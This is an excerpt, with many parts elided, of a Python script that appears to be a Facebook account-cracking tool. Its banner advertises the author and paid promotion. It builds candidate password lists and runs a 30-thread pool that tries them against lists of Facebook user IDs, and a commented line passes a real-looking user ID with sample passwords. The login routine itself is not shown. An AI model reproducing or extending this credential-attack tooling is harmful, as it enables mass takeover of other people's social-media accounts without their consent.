...
def logo():
    ...
    print(f"""{white}
      ...
      YP  YP  YP YP   YP 88   YD Y888888P {green} Hasnain """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : Hasnain Albalushi")
    print(f" {white}{green}[~]{white} Facebook  : Hasnain Albalushi")
    print(f" {white}{green}[~]{white} Fucked By : Hasnain Albalushi")
    print(f" {white}{green}[~]{white} Tool      : Hasnain Albalushi Facebook ")
    print(f" {white}{green}[~]{white} Github    :  https://github.com/Hasnainalbalushi/HasnainAlbalushi786.git")
    print(f" {white}{green}[~]{white} Whatsapp  : 03248233751 Only Paid Promotion ")
...
def file_crack():
    ...
    for i in range(limit):
        ...
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as HasnainAlbalushiID:
        ...
        for uid in uidX:
            HasnainAlbalushiID.submit(bapif,uid,pwx,total)
    print(50*"-")
...
if __name__=="__main__":
     infinty()
     #bapif("100034118766868|'BilalHaider id",["4292416"],"2222")
